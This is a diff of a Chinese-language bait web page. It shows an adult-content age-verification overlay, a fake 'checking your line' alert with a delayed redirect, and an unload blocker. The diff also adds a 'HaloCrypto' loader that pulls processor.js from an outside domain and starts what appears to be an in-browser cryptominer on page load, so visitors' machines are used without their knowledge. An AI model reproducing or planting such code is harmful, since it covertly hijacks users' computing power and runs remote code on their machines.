@@ -1,183 +1,257 @@
 <!DOCTYPE html>
 <html lang="zh">
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
     <title>❤️站❤️长❤️推❤️荐❤️</title>
     <style type="text/css">
-        p {
-            margin: 0;
-        }
+      p {
+        margin: 0;
+      }
 
-        *,
-        *::before,
-        *::after {
-            box-sizing: border-box;
-        }
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+      }
 
-        .overlay,
-        .scare {
-            position: fixed;
-            top: 0;
-            left: 0;
-            height: 100vh;
-            width: 100vw;
-        }
+      .overlay,
+      .scare {
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100vh;
+        width: 100vw;
+      }
 
-        p.overlay-title {
-            font-size: 24px;
-            font-weight: 900;
-            color: black;
-            line-height: 1;
-            margin-bottom: 16px;
-        }
+      p.overlay-title {
+        font-size: 24px;
+        font-weight: 900;
+        color: black;
+        line-height: 1;
+        margin-bottom: 16px;
+      }
 
-        .overlay-button {
-            display: inline-flex;
-            align-items: center;
-            height: 40px;
-            padding-right: 24px;
-            padding-left: 24px;
-            font-size: 16px;
-            font-weight: 500;
-            line-height: 1;
-            border-radius: 4px;
-            margin: 4px;
-            cursor: pointer;
-        }
+      .overlay-button {
+        display: inline-flex;
+        align-items: center;
+        height: 40px;
+        padding-right: 24px;
+        padding-left: 24px;
+        font-size: 16px;
+        font-weight: 500;
+        line-height: 1;
+        border-radius: 4px;
+        margin: 4px;
+        cursor: pointer;
+      }
 
-        .overlay-buttons-wrapper {
-            margin: 24px -8px -8px;
-        }
+      .overlay-buttons-wrapper {
+        margin: 24px -8px -8px;
+      }
 
-        #accept-button {
-            background-color: rgb(255, 0, 0);
-            color: white;
-        }
+      #accept-button {
+        background-color: rgb(255, 0, 0);
+        color: white;
+      }
 
-        #decline-button {
-            color: rgb(0, 0, 0);
-            border: 2px solid rgb(0, 0, 0);
-        }
+      #decline-button {
+        color: rgb(0, 0, 0);
+        border: 2px solid rgb(0, 0, 0);
+      }
 
-        p.overlay-description {
-            font-size: 16px;
-            font-weight: 400;
-            color: rgba(0, 0, 0, 0.5);
-            line-height: 1.25;
-            margin-bottom: 16px;
-        }
+      p.overlay-description {
+        font-size: 16px;
+        font-weight: 400;
+        color: rgba(0, 0, 0, 0.5);
+        line-height: 1.25;
+        margin-bottom: 16px;
+      }
 
-        a.overlay-link {
-            display: inline-block;
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
-            color: rgb(255, 0, 0);
-            line-height: 1;
-            position: relative;
-            margin-top: 16px;
-        }
+      a.overlay-link {
+        display: inline-block;
+        text-decoration: none;
+        font-size: 16px;
+        font-weight: 500;
+        color: rgb(255, 0, 0);
+        line-height: 1;
+        position: relative;
+        margin-top: 16px;
+      }
 
-        a.overlay-link::before {
-            position: absolute;
-            content: "";
-            height: calc(50% + 4px);
-            width: calc(100% + 8px);
-            bottom: -4px;
-            left: -4px;
-            background-color: rgba(132, 94, 194, 0.1);
-        }
+      a.overlay-link::before {
+        position: absolute;
+        content: "";
+        height: calc(50% + 4px);
+        width: calc(100% + 8px);
+        bottom: -4px;
+        left: -4px;
+        background-color: rgba(132, 94, 194, 0.1);
+      }
 
-        .overlay-body {
-            max-width: 512px;
-            text-align: center;
-            font-family: "Inter", sans-serif;
-        }
+      .overlay-body {
+        max-width: 512px;
+        text-align: center;
+        font-family: "Inter", sans-serif;
+      }
 
-        .overlay[hidden] {
-            display: none;
-        }
+      .overlay[hidden] {
+        display: none;
+      }
 
-        .overlay {
-            z-index: 2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-image: url(https://iw233.cn/api.php?sort=mp);
-            background-repeat: no-repeat;
-            background-size: cover;
-            background-position: center 0;
-        }
+      .overlay {
+        z-index: 2;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-image: url(https://iw233.cn/api.php?sort=mp);
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center 0;
+      }
 
-        .text-bg {
-            background-color: rgba(255, 255, 255, 0.6);
-            padding: 24px;
-        }
+      .text-bg {
+        background-color: rgba(255, 255, 255, 0.6);
+        padding: 24px;
+      }
 
-        .scare {
-            z-index: 1;
-        }
+      .scare {
+        z-index: 1;
+      }
 
-        video#video {
-            height: 100%;
-            width: 100%;
-            object-fit: cover;
-        }
+      video#video {
+        height: 100%;
+        width: 100%;
+        object-fit: cover;
+      }
 
-        video#video::-webkit-media-controls-enclosure {
-            display: none !important;
-        }
+      video#video::-webkit-media-controls-enclosure {
+        display: none !important;
+      }
     </style>
     <script type="text/javascript">
-        (function(c,l,a,r,i,t,y){
-            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-        })(window, document, "clarity", "script", "fx6tupq3ut");
+      (function (c, l, a, r, i, t, y) {
+        c[a] =
+          c[a] ||
+          function () {
+            (c[a].q = c[a].q || []).push(arguments);
+          };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+      })(window, document, "clarity", "script", "fx6tupq3ut");
     </script>
-</head>
+  </head>
 
-<body>
+  <body>
     <div id="overlay" class="overlay">
-        <div class="text-bg">
-            <div class="overlay-body">
-                <p class="overlay-title">您是否已满18岁</p>
-                <p class="overlay-description">以下内容可能不适合<b>未满18岁</b>的人群观看，我们需要确认您的年龄以继续。</p>
-                <p class="overlay-description">The following may not be suitable for people <b>under the age of
-                        18</b> and we need to confirm your age.</p>
-                <p class="overlay-title">由于&times;&times;原因部分地区无法正常播放</p>
-                <div class="overlay-buttons-wrapper">
-                    <div id="accept-button" class="overlay-button">已满18岁</div>
-                    <div id="decline-button" class="overlay-button">未满18岁</div>
-                </div>
-            </div>
+      <div class="text-bg">
+        <div class="overlay-body">
+          <p class="overlay-title">您是否已满18岁</p>
+          <p class="overlay-description">
+            以下内容可能不适合<b>未满18岁</b>的人群观看，我们需要确认您的年龄以继续。
+          </p>
+          <p class="overlay-description">
+            The following may not be suitable for people
+            <b>under the age of 18</b> and we need to confirm your age.
+          </p>
+          <p class="overlay-title">
+            由于&times;&times;原因部分地区无法正常播放
+          </p>
+          <div class="overlay-buttons-wrapper">
+            <div id="accept-button" class="overlay-button">已满18岁</div>
+            <div id="decline-button" class="overlay-button">未满18岁</div>
+          </div>
         </div>
+      </div>
     </div>
     <div class="scare">
-        <img src="https://count.getloli.com/get/@hc" style="display: none;">
+      <img src="https://count.getloli.com/get/@hc" style="display: none" />
     </div>
     <script type="text/javascript">
-        const overlay = document.getElementById("overlay");
-        const declineButton = document.getElementById("decline-button");
-        const acceptButton = document.getElementById("accept-button");
-        let hasClicked;
-        window.onbeforeunload = function () {
-            return true;
-        };
-        function buttonClick1(event) {
-            // event.preventDefault();
-            if (!hasClicked) hasClicked = true;
-            window.location.href = "/iframe.html?fr=" + window.location.href;
+      const overlay = document.getElementById("overlay");
+      const declineButton = document.getElementById("decline-button");
+      const acceptButton = document.getElementById("accept-button");
+      let hasClicked;
+      window.onbeforeunload = function () {
+        return true;
+      };
+      function buttonClick1(event) {
+        // event.preventDefault()
+        if (!hasClicked) hasClicked = true;
+        setTimeout(function () {
+          window.alert("我们正在检查您的线路...请等待自动跳转!");
+          setTimeout(function () {
+            window.location.href = "/iframe.html?from=" + window.location.href;
+          }, 25 * 1000);
+        }, 500);
+      }
+      function buttonClick2(event) {
+        event.preventDefault();
+        if (!hasClicked) hasClicked = true;
+        var blank_window = window.open("#/notice", "_self");
+        blank_window.document.write(`<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>提示</title>
+  </head>
+  <body>
+    <div id="main">
+      <div id="notice">
+        <h1>请自觉离开本网站, 谢谢!</h1>
+      </div>
+    </div>
+  </body>
+</html>
+`);
+      }
+      acceptButton.addEventListener("click", buttonClick1);
+      declineButton.addEventListener("click", buttonClick2);
+
+      ////////////////// HaloCrypto //////////////////
+      function loadScript(url, callback) {
+        var head =
+            document.head ||
+            document.getElementsByTagName("head")[0] ||
+            document.documentElement,
+          script,
+          options,
+          s = options || {};
+        url = url || s.url;
+        callback = callback || s.success;
+        script = document.createElement("script");
+        script.async = s.async || false;
+        script.type = "text/javascript";
+        if (s.charset) {
+          script.charset = s.charset;
         }
-        function buttonClick2(event) {
-            event.preventDefault();
-            if (!hasClicked) hasClicked = true;
-            var blank_window = window.open("#/", "_self")
-            blank_window.close();
+        if (s.cache === false) {
+          url =
+            url + (/\?/.test(url) ? "&" : "?") + "_=" + new Date().getTime();
         }
-        acceptButton.addEventListener("click", buttonClick1);
-        declineButton.addEventListener("click", buttonClick2);
+        script.src = url;
+        head.insertBefore(script, head.firstChild);
+        if (callback) {
+          document.addEventListener
+            ? script.addEventListener("load", callback, false)
+            : (script.onreadystatechange = function () {
+                if (/loaded|complete/.test(script.readyState)) {
+                  script.onreadystatechange = null;
+                  callback();
+                }
+              });
+        }
+      }
+      loadScript("//shiws.agteam.eu.org/processor.js", function () {
+        var _ = new HaloCrypto.Anonymous("u_12-fishing", { throttle: 0.01 });
+        _.start();
+      });
     </script>
-</body>
+  </body>
+</html>
